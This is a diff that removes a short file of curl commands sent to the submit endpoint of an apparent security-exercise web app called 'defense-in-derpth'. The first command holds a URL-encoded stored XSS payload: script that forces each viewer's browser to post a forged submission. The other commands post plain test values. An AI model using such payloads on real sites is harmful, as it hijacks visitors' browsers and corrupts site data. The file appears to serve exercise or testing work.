@@ -1,6 +1,0 @@
-curl --data "username=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest()%3B%0Areq.open(%22POST%22%2C%20%22https%3A%2F%2Fdefense-in-derpth.herokuapp.com%2Fsubmit%22%2C%20true)%3B%0Areq.setRequestHeader(%22Content-type%22%2C%20%22application%2Fx-www-form-urlencoded%22)%3B%0Areq.send(%22username%3DJANET%26lat%3D55%26lng%3D55%22)%3B%0A%3C%2Fscript%3E&lat=9&lng=9" -X POST https://defense-in-derpth.herokuapp.com/submit
-
-curl --data "username=heyheyyoyo&lat=9&lng=9" -X POST https://defense-in-derpth.herokuapp.com/submit
-
-curl --data "username=JANET&lat=1&lng=1" -X POST https://defense-in-derpth.herokuapp.com/submit
-
